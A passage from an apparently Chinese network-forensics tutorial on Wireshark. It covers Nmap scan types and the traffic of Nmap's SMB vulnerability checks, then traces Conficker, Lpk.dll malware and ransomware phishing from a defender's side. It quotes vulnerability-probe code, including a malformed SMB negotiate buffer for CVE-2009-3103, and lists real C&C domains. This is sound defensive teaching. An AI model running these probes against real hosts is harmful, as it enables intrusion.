
如下图，扫描方发送`FIN`包，如果端口关闭则返回`RST ACK`包。

![enter image description here](http://www.anquan.us/static/drops/full/fa96cf629bf0550bacafeadb65f162f9f3e293fa.jpg)

**4、秘密扫描TCPACK**

`TCP ACK`扫描是利用标志位`ACK`，而`ACK`标志在`TCP`协议中表示确认序号有效，它表示确认一个正常的`TCP`连接。但是在`TCP AC`K扫描中没有进行正常的`TCP`连接过程，实际上是没有真正的`TCP`连接。所以使用`TCP ACK`扫描不能够确定端口的关闭或者开启，因为当发送给对方一个含有`ACK`表示的`TCP`报文的时候，都返回含有`RST`标志的报文，无论端口是开启或者关闭。但是可以利用它来扫描防火墙的配置和规则等。

![enter image description here](http://www.anquan.us/static/drops/full/238b8f9af5713772fc197c0a44855d767dd0eebf.jpg)

**5、UDP端口扫描**

前面的扫描方法都是针对`TCP`端口，针对`UDP`端口一般采用`UDP ICMP`端口不可达扫描。

如：`192.1.14.235`对`172.16.2.4`发送大量`UDP`端口请求，扫描其开启`UDP`端口的情况。

![enter image description here](http://www.anquan.us/static/drops/full/bc2eaa84e0bde499335684a40782205f85a3c061.jpg)

如果对应的`UDP`端口开启，则会返回`UDP`数据包。

![enter image description here](http://www.anquan.us/static/drops/full/42a9e1ff348789a104733ce2550d8aaba3c7d4ba.jpg)

如果端口未开启，则返回“`ICMP`端口不可达”消息。

![enter image description here](http://www.anquan.us/static/drops/full/05670c17974cb2698ee4190bfdec92df6fa578c0.jpg)



### 2.4.3 操作系统的探测

------

`NMAP`进行操作系统的探测主要用到的是`OS`探测模块，使用`TCP/IP`协议栈指纹来识别不同的操作系统和设备。`Nmap`内部包含了`2600`多种已知操作系统的指纹特征，根据扫描返回的数据包生成一份系统指纹，将探测生成的指纹与`nmap-os-db`中指纹进行对比，查找匹配的操作系统。如果无法匹配，则以概率形式列举出可能的系统。

如：`192.168.1.50`对`192.168.1.90`进行操作系统的扫描探测。首先发起`Ping`请求，确认主机是否存在。

![enter image description here](http://www.anquan.us/static/drops/full/b9955f09febd9fcee07178b27e8d9ed22286eba8.jpg)

发起`ARP`请求，获取主机`MAC`地址。

![enter image description here](http://www.anquan.us/static/drops/full/6ff8bc4dcb0bbbf9900154a6741b04b89d578616.jpg)

进行端口扫描。

![enter image description here](http://www.anquan.us/static/drops/full/6b625051cf153227adf677d211a3a005035a7fb0.jpg)

根据综合扫描情况，判断操作系统类型。

![enter image description here](http://www.anquan.us/static/drops/full/884d70519657abfe320974c9657f183fd3caab88.jpg)

### 2.4.4 漏洞扫描

------

操作系统的漏洞探测种类很多，本文针对“`smb-check-vulns`”参数就`MS08-067`、`CVE2009-3103`、`MS06-025`、`MS07-029`四个漏洞扫描行为进行分析。

攻击主机：`192.168.1.200`（Win7），目标主机：`192.168.1.40`（WinServer 03）；

`Nmap`扫描命令：`nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.1.40`。

![enter image description here](http://www.anquan.us/static/drops/full/9b962b0df502b85d0aa8ca1cceceabb95b4f11f1.jpg)

**1、端口扫描**

漏洞扫描前，开始对目标主机进行端口扫描。

![enter image description here](http://www.anquan.us/static/drops/full/33111e358878087174262aceba832966faddd62b.jpg)

**2、SMB协议简单分析**

由于这几个漏洞多针对SMB服务，下面我们简单了解一下`NAMP`扫描行为中的SMB命令。

SMB Command:`Negotiate Protocol`(0x72)：SMB协议磋商

SMB Command: `Session Setup AndX`(0x73)：建立会话，用户登录

SMB Command: `Tree Connect AndX` (0x75)：遍历共享文件夹的目录及文件

SMB Command: `NT Create AndX` (0xa2)：打开文件，获取文件名，获得读取文件的总长度

SMB Command: `Write AndX` (0x2f)：写入文件，获得写入的文件内容

SMB Command:`Read AndX`(0x2e)：读取文件，获得读取文件内容

SMB Command: `Tree Disconnect`(0x71)：客户端断开

SMB Command: `Logoff AndX`(0x74)：退出登录

![enter image description here](http://www.anquan.us/static/drops/full/58cd1fdba3382ef38f5e63556fca227202a12f11.jpg)

**3、MS08-067漏洞**

**（1）MS08-067漏洞扫描部分源码如下：**

```
function check_ms08_067(host)
    if(nmap.registry.args.safe ~= nil) then
        return true, NOTRUN
    end
    if(nmap.registry.args.unsafe == nil) then
        return true, NOTRUN
    end
    local status, smbstate
    local bind_result, netpathcompare_result

    -- Create the SMB session  \\创建SMB会话
    status, smbstate = msrpc.start_smb(host, "\\\\BROWSER")
    if(status == false) then
        return false, smbstate
    end

    -- Bind to SRVSVC service
    status, bind_result = msrpc.bind(smbstate, msrpc.SRVSVC_UUID, msrpc.SRVSVC_VERSION, nil)
    if(status == false) then
        msrpc.stop_smb(smbstate)
        return false, bind_result
    end

    -- Call netpathcanonicalize
--  status, netpathcanonicalize_result = msrpc.srvsvc_netpathcanonicalize(smbstate, host.ip, "\\a", "\\test\\")

    local path1 = "\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\..\\n"
    local path2 = "\\n"
    status, netpathcompare_result = msrpc.srvsvc_netpathcompare(smbstate, host.ip, path1, path2, 1, 0)

    -- Stop the SMB session
    msrpc.stop_smb(smbstate)
```

**（2）分析**

尝试打开“`\\BROWSER`”目录，下一包返回成功。

![enter image description here](http://www.anquan.us/static/drops/full/b6f2425a80b7093fa3f9bfebe27ce2ba04d8d174.jpg)

同时还有其它尝试，均成功，综合判断目标存在`MS08-067`漏洞。通过`Metasploit`进行漏洞验证，成功溢出，获取Shell。

![enter image description here](http://www.anquan.us/static/drops/full/2a00b655456e320f5fbc4a23d8e2f032886f3dde.jpg)

**4、CVE-2009-3103漏洞**

**（1）CVE-2009-3103漏洞扫描部分源码如下：**

```
host = "IP_ADDR", 445
buff = (
"\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x26"# Process ID High: --> :) normal value should be "\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
"\x30\x30\x32\x00"
)
```

**（2）分析**

十六进制字符串“`0x00000000`到`202e30303200`”请求，通过`ASCII`编码可以看出是在探测`NTLM`和`SMB`协议的版本。无响应，无此漏洞。

![enter image description here](http://www.anquan.us/static/drops/full/4907b7e22f490718957fb9957247ac3610e138c5.jpg)

**5、MS06-025漏洞**

**（1）MS06-025漏洞扫描部分源码如下：**

```
--create the SMB session
--first we try with the "\router" pipe, then the "\srvsvc" pipe.
local status, smb_result, smbstate, err_msg
status, smb_result = msrpc.start_smb(host, msrpc.ROUTER_PATH)
if(status == false) then
err_msg = smb_result
status, smb_result = msrpc.start_smb(host, msrpc.SRVSVC_PATH) --rras is also accessible across SRVSVC pipe
if(status == false) then
    return false, NOTUP --if not accessible across both pipes then service is inactive
end
end
smbstate = smb_result
--bind to RRAS service
local bind_result
status, bind_result = msrpc.bind(smbstate, msrpc.RASRPC_UUID, msrpc.RASRPC_VERSION, nil)
if(status == false) then 
msrpc.stop_smb(smbstate)
return false, UNKNOWN --if bind operation results with a false status we can't conclude anything.
End
```

**（2）分析**

先后尝试去连接“`\router`”、“ `\srvsvc`”路径，均报错，无`RAS RPC`服务。

![enter image description here](http://www.anquan.us/static/drops/full/da8a2435fa821983e42ff5c6c18db6f11d29fb8f.jpg)

![enter image description here](http://www.anquan.us/static/drops/full/62efda9ae1ff96d6f2252a24dc28aa2a101a1590.jpg)

**6、MS07-029漏洞**

**（1）MS07-029漏洞扫描部分源码如下：**

```
function check_ms07_029(host)
    --check for safety flag  
if(nmap.registry.args.safe ~= nil) then
        return true, NOTRUN
end
if(nmap.registry.args.unsafe == nil) then
return true, NOTRUN
end
    --create the SMB session
    local status, smbstate
    status, smbstate = msrpc.start_smb(host, msrpc.DNSSERVER_PATH)
    if(status == false) then
        return false, NOTUP --if not accessible across pipe then the service is inactive
    end
    --bind to DNSSERVER service
    local bind_result
    status, bind_result = msrpc.bind(smbstate, msrpc.DNSSERVER_UUID, msrpc.DNSSERVER_VERSION)
    if(status == false) then
        msrpc.stop_smb(smbstate)
        return false, UNKNOWN --if bind operation results with a false status we can't conclude anything.
    end
    --call
    local req_blob, q_result
    status, q_result = msrpc.DNSSERVER_Query(
        smbstate, 
        "VULNSRV", 
        string.rep("\\\13", 1000), 
        1)--any op num will do
    --sanity check
    msrpc.stop_smb(smbstate)
    if(status == false) then
        stdnse.print_debug(
            3,
            "check_ms07_029: DNSSERVER_Query failed")
        if(q_result == "NT_STATUS_PIPE_BROKEN") then
            return true, VULNERABLE
        else
            return true, PATCHED
        end
    else
        return true, PATCHED
    end
end
```

**（2）分析**

尝试打开“`\DNSSERVER`”，报错，未开启`DNS RPC`服务。

![enter image description here](http://www.anquan.us/static/drops/full/a71e4f4c9aa3862e25935662f14fb347b8d58a78.jpg)

### 2.4.5 总结

------

1、扫描探测可以说是所有网络中遇到最多的攻击，因其仅仅是信息搜集而无实质性入侵，所以往往不被重视。但扫描一定是有目的的，一般都是攻击入侵的前兆。

2、修补漏洞很重要，但如果在扫描层面进行防御，攻击者就无从知晓你是否存在漏洞。

3、扫描探测一般都无实质性通信行为，同时大量重复性动作，所以在流量监测上完全可以做到阻止防御。



## 2.5 “Lpk.dll劫持+ 飞客蠕虫”病毒

### 2.5.1 发现问题

在对客户网络内网进行流量监控时发现，一台主机`172.25.112.96`不断对`172.25.112.1/24`网段进行TCP445端口扫描，这个行为目的在于探测内网中哪些机器开启了SMB服务，这种行为多为木马的通信特征。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0q2izi0j20yh0go7as.jpg)

过滤这个主机IP的全部数据，发现存在大量ARP协议，且主机172.25.112.96也不断对内网网段进行ARP扫描。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0q9z69rj20yv0hlq9b.jpg)

发现问题后，我们就开启对这台主机的深入分析了。

### 2.5.2 Lpk.dll劫持病毒

------

第一步，DNS协议分析。过滤这台主机的DNS协议数据，从域名、IP、通信时间间隔综合判断，初步找出可疑域名。如域名yuyun168.3322.org，对应IP为61.160.213.189。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0qu8vmjj20z00gsdk3.jpg)

过滤IP为61.160.213.189的全部数据可以看到主机172.25.112.96不断向IP地址61.160.213.189发起TCP7000端口的请求，并无实际通信数据，时间间隔基本为24秒。初步判断为木马回联通信。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0rfqwrkj20yx0gpagv.jpg)

再发现可疑域名gcnna456.com，对应IP为115.29.244.159。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0rw69aaj20yu0hpgq2.jpg)

过滤IP为`115.29.244.159`的全部数据可以看到主机172.25.112.96不断向IP地址115.29.244.159发起TCP3699端口的请求，并无实际通信数据，时间间隔也基本为24秒。初步判断也为木马通信数据。

把这两个域名请求的DNS信息都提取出来（当然，这里仅用WireShark实现就比较困难了，可以开发一些工具或利用设备），部分入库后可看见：

| 时间           | 客户端        | 服务器        | 域名              |
| -------------- | ------------- | ------------- | ----------------- |
| 2015/8/3 19:40 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:40 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:42 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:42 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:42 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:42 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:44 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | yuyun168.3322.org |
| 2015/8/3 19:44 | 172.25.112.96 | 8.8.8.8       | yuyun168.3322.org |
| 时间           | 客户端        | 服务器        | 域名              |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:41 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:41 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:42 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:42 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:42 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:42 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:42 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:42 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:43 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:43 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:44 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:44 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:44 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:44 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:45 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:45 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:45 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:45 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:46 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |
| 2015/8/3 19:46 | 172.25.112.96 | 8.8.8.8       | gcnna456.com      |
| 2015/8/3 19:46 | 8.8.8.8       | 172.25.112.96 | gcnna456.com      |

从统计可以看出，这两个域名的请求一直在持续，且时间间隔固定。

为探明事实真相，我们对这台电脑进程进行监控，发现了两个可疑进程，名称都是`hrl7D7.tmp`，从通信IP和端口发现与前面分析完全吻合。也就是说，域名yuyun168.3322.org和gcnna456.com的DNS请求数据和回联数据都是进程hrl7D7.tmp产生的。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0swcwehj20yu0gqdmp.jpg)

进一步查询资料和分析确认，这个恶意进程为Lpk.dll劫持病毒。

### 2.5.3 飞客（Conficker）蠕虫

当然，完全依靠域名（DNS）的安全分析是不够的，一是异常通信很难从域名解析判断完整，二是部分恶意连接不通过域名请求直接与IP进行通信。在对这台机器的Http通信数据进行分析时，又发现了异常：HTTP协议的头部请求中存在不少的“GET /search?q=1”的头部信息。

如IP为95.211.230.75的请求如下：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0tnw5jdj20yu0gqdmp.jpg)

Follow TCPStream提取请求信息如下，请求完整Url地址为：95.211.230.75/search?q=1，返回HTTP404，无法找到页面。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0u4cwjdj20lb0gd766.jpg)



通过请求特征“/search?q=1”继续分析，如IP地址221.8.69.25，请求时间不固定，大约在20秒至1分钟。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0uc2kkfj20yx0hl0xz.jpg)

再如IP地址38.102.150.27，请求时间也不是很固定。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0ui34m0j20yy0hmdlc.jpg)

再如IP地址216.66.15.109，请求时间也不是很固定。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0uqg4e4j20yx0hltej.jpg)

把含此特征的请求IP、域名以及HTTP返回状态码进行统计，如下表：

| 时间  | 客户端        | 服务器         | 请求URL                          | 状态 |
| ----- | ------------- | -------------- | -------------------------------- | ---- |
| 19:03 | 172.25.112.96 | 221.8.69.25    | http://221.8.69.25/search?q=1    | 200  |
| 19:03 | 172.25.112.96 | 38.102.150.27  | http://38.102.150.27/search?q=1  | 404  |
| 19:04 | 172.25.112.96 | 216.66.15.109  | http://216.66.15.109/search?q=1  | 404  |
| 19:14 | 172.25.112.96 | 95.211.230.75  | http://95.211.230.75/search?q=1  | 404  |
| 19:29 | 172.25.112.96 | 46.101.184.102 | http://46.101.184.102/search?q=1 | 200  |
| 3:17  | 172.25.112.96 | 54.148.180.204 | http://54.148.180.204/search?q=1 | 404  |

可以发现，一共请求了6个IP地址，请求URL地址都为http://IP地址/searh?q=1，有4个IP请求网页不存在，有两个请求网页成功。

过滤DNS协议，通过搜索找到6个IP对应的域名：

```
221.8.69.25：nntnlbaiqq.cn；
38.102.150.27：boqeynxs.ws；
216.66.15.109：odmwdf.biz；
95.211.230.75：ehipldpmdgw.info；
46.101.184.102：eqkopeepjla.info；
54.148.180.204：rduhvg.net；
```

可以看出6个域名名称都很像随机生成的。对DNS进一步分析时还发现大量无法找到地址的域名请求，如图：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0uyroplj20yv0hm0zq.jpg)

将此错误请求进行统计，仅在监控期间就请求过148个错误的域名。通过这些域名名称可以初步判断，该病毒请求采用了DGA算法随机生成的C&C域名（详细了解可移步：[http://drops.wooyun.org/tips/6220][用机器学习识别随机生成的C&C域名]）。大量随机生成的域名不存在或控制端服务器已注销关机，导致大量请求失败。

| 时间           | 客户端        | 服务器  | 查询             | 状态 |
| -------------- | ------------- | ------- | ---------------- | ---- |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | nlasowhlhj.org   | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | diadcgtj.com     | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | idwcjhvd.com     | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | cacbwanw.net     | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | pqepudpjcnc.org  | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | lqxlx.cc         | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | qmnqag.info      | 失败 |
| 2015/8/3 22:31 | 172.25.112.96 | 8.8.8.8 | tivet.org        | 失败 |
| 2015/8/3 22:32 | 172.25.112.96 | 8.8.8.8 | zvzpzgtiz.com    | 失败 |
| 2015/8/3 22:32 | 172.25.112.96 | 8.8.8.8 | whfgzs.cc        | 失败 |
| 2015/8/3 22:32 | 172.25.112.96 | 8.8.8.8 | uqowfosm.com     | 失败 |
| 2015/8/3 22:32 | 172.25.112.96 | 8.8.8.8 | pxidlhtlhqz.org  | 失败 |
| 2015/8/3 22:32 | 172.25.112.96 | 8.8.8.8 | hzxloguigf.org   | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | yaovrr.com       | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | iazabdcwf.net    | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | qbzzehgnadn.net  | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | xvmtjcehe.net    | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | pvugavxsx.org    | 失败 |
| 2015/8/3 22:33 | 172.25.112.96 | 8.8.8.8 | lgxvyyzs.info    | 失败 |
| 2015/8/3 22:34 | 172.25.112.96 | 8.8.8.8 | rspgnhx.com      | 失败 |
| 2015/8/3 22:34 | 172.25.112.96 | 8.8.8.8 | pbwgoe.com       | 失败 |
| 2015/8/3 22:34 | 172.25.112.96 | 8.8.8.8 | wtexobkv.net     | 失败 |
| 2015/8/3 22:34 | 172.25.112.96 | 8.8.8.8 | jjvyyyexxk.cc    | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | uvxklheapu.net   | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | wdbsw.org        | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | wsflkzxud.net    | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | zmbfcf.org       | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | uzerepiq.net     | 失败 |
| 2015/8/3 22:35 | 172.25.112.96 | 8.8.8.8 | vszcgubl.info    | 失败 |
| 2015/8/3 22:36 | 172.25.112.96 | 8.8.8.8 | aqerqeiigme.info | 失败 |
| 2015/8/3 22:36 | 172.25.112.96 | 8.8.8.8 | zrpavmfitq.cc    | 失败 |
| 2015/8/3 22:36 | 172.25.112.96 | 8.8.8.8 | ugoxslfxazt.net  | 失败 |
| 2015/8/3 22:36 | 172.25.112.96 | 8.8.8.8 | tzorilkpyg.com   | 失败 |
| 2015/8/3 22:36 | 172.25.112.96 | 8.8.8.8 | oqhwvgpvsjw.info | 失败 |
| 2015/8/3 22:37 | 172.25.112.96 | 8.8.8.8 | icsqhpnr.org     | 失败 |
| 2015/8/3 22:37 | 172.25.112.96 | 8.8.8.8 | bpvuftucv.org    | 失败 |
| 2015/8/3 22:37 | 172.25.112.96 | 8.8.8.8 | kmdgcblyibz.cc   | 失败 |
| 2015/8/3 22:38 | 172.25.112.96 | 8.8.8.8 | xilpn.cc         | 失败 |
| 2015/8/3 22:38 | 172.25.112.96 | 8.8.8.8 | iumygnris.org    | 失败 |
| 2015/8/3 22:38 | 172.25.112.96 | 8.8.8.8 | tmypuykvfzj.com  | 失败 |
| 2015/8/3 22:38 | 172.25.112.96 | 8.8.8.8 | jhiozaveoi.net   | 失败 |
| 2015/8/3 22:39 | 172.25.112.96 | 8.8.8.8 | gvjrenffp.net    | 失败 |
| 2015/8/3 22:39 | 172.25.112.96 | 8.8.8.8 | geiradmz.info    | 失败 |

过滤IP为221.8.69.25的HTTP成功请求数据，提取文本内容可以看到请求成功的网页显示内容：

```
<html><body><h1>Conficker Sinkhole By CNCERT/CC!</h1>
</body></html>
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0v7yby8j20l90gaq49.jpg)

通过HTTP响应可以推断，该机器可能感染了飞客（Conficker）蠕虫病毒，进一步我们推断国家互联网应急中心（CNCERT/CC）已得知此域名被飞客病毒所用，并将该域名放入飞客病毒域名污水池（Sinkhole）以缓解该病毒带来的风险。

至此基本确定该主机已感染飞客病毒，后续我们使用飞客病毒专杀工具进行杀毒，并对操作系统进行补丁修复后，该主机网络通讯恢复正常。

### 2.5.4 总结

1. 关于Lpk.dll、Confiker病毒的逆向分析，网上有很多资料，本文就不继续分析；
2. 无论是木马还是恶意病毒，一旦感染就会与外界通信，就可以通过流量监测发现；
3. 木马病毒的内网渗透行为可基于局域网监测分析技术进行监控；木马病毒的回联通信行为分析可结合域名请求、心跳数据特征检测进行分析。



## 2.6 勒索邮件

### 2.6.1 前言

近期，越来越多的人被一种恶意软件程序勒索，电脑上的多种重要文件都被加密而无法打开，并且无计可施，只能乖乖支付赎金，以对文件解密。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xi0avt1oj20fe0a2q3o.jpg)

网上关于该类病毒的详细分析案例很多，在此不再详述。本文分享主要通过WireShark从流量分析判断勒索邮件、再进行深入分析。



### 2.6.2 截获邮件样本

------

通过监控某政府邮件服务器发现，近期大量用户收到此诈骗勒索邮件，邮件的发件人一般为陌生人，收件人指向明确，且带有跟收件人名称一致的ZIP附件，邮件内容一般为“请检查附件的XX，为了避免罚款，你必须在X小时内支付。”的诈骗威胁内容。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xi0sr2w1j20nt0fljsl.jpg)

解压ZIP附件可发现病毒文件。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xi110q9yj20hh04dq36.jpg)

### 2.6.3 WireShark分析

------

对于邮件协议的分析，我们首先按OSI七层模型对其数据进行建模，对网络协议的每层进行分析，最后汇总其安全性。（同样适用于其它协议）

![img](http://www.anquan.us/static/drops/full/8e197e8c0218a09cec8ebc2f2cbf360106a5fe0f.jpg)

**（一） 物理层分析**

暂不做分析。

**（二） 链路层分析**

由于该流量接入点为邮件服务器边界出口，所以多为SMTP数据。该数据链路层帧格式为以太帧（Ethernet II），共14字节，前12字节表示两端的MAC地址，后两字节`0x0800`表示后接IPV4协议。

![img](http://www.anquan.us/static/drops/full/30dbc52607c4125b9481b59fd78372261fb9809a.jpg)

此层数据无异常。

**（三） 网络层分析**

从网络层数据开始，我们就会逐渐发现异常。当然，这个数据在网络层对我们有用的也就是源、目的IP地址。源地址10.190.3.172为邮件服务器地址，目的地址191.102.101.248 （哥伦比亚）为发件方地址。

![img](http://www.anquan.us/static/drops/full/6881fb2ed55a976d2b8e824188cc846008b0b991.jpg)

简单做几个测试，就发现有异常：

1. `191.102.101.248`并未开放TCP25端口；
2. `191.102.101.248`与elynos.com无关；

初步判断发件人的邮箱是伪造的。

**（四） 传输层分析**

我们简单统计一下该数据的TCP25端口，发现在包数量等于28的附近区域，有大量不同IP发来的邮件，且字节长度也基本相等，可以初步判断大量邮箱收到差不内容的异常邮件。

![img](http://www.anquan.us/static/drops/full/69faaaa1bb30a2652bddec963b65207f2145ae19.jpg)

提取一封follow tcpstream，可看出，也是一封勒索邮件。

![img](http://www.anquan.us/static/drops/full/774598997dedb88eb0963fe98964a82bd765d8cb.jpg)

**（五） 会话层分析**

SMTP协议在会话层一般分析要素包括：认证过程、收发关系、加密协商、头部协商等。

将一封邮件的会话Follow TCPStream，可以看出邮件的发件人是来自外部的“陌生人”。

![img](http://www.anquan.us/static/drops/full/7b648e4dc64bf11ac92a7ec3b9bc168aa03eba09.jpg)

我们将部分邮件收发关系进行汇总，可以看出虽然发着同样的勒索邮件，但其发件人地址为了躲避垃圾邮件过滤，伪造了大量的邮箱地址及域名。

![img](http://www.anquan.us/static/drops/full/068a90d7ea2cffd9c8881e07db5e1ebeb46bef79.jpg)

**（六） 表示层分析**

在表示层分析要素一般包括编码和列表等，由于此邮件属于正常通信邮件，在表示层无异常因素。

**（七） 应用层分析**

针对此案例，应用层分析目标包括：邮件正文内容安全、邮件附件安全、是否为垃圾邮件等。

![img](http://www.anquan.us/static/drops/full/b2c6f9c77bcc4f988c748bb4bd154d8c5e66eb18.jpg)

1.指向性：收件人邮箱名为：`voice5@X.gov.cn`，邮件正文称呼为“dear voice5”，邮件附件名称为“`voice5_*.zip`”，可看出此勒索邮件为骗取点击率，进行了简单的社工。

2.邮件正文：

“Please check the bill in attachment.

In order to avoid fine you have to pay in 48 hours.”

明显的诈骗威胁内容。

3.将此邮件内容Save一下，可得到附件内容。通过分析，可确认附件为敲诈勒索病毒。（本文不详述）

![img](http://www.anquan.us/static/drops/full/ff012498eb760db332762f981ca07c1d9c9329bf.jpg)

### 2.6.4 勒索病毒分析

------

**（注：本章节不全属于Wireshark分析范畴）**

**（一）病毒初始化文件**

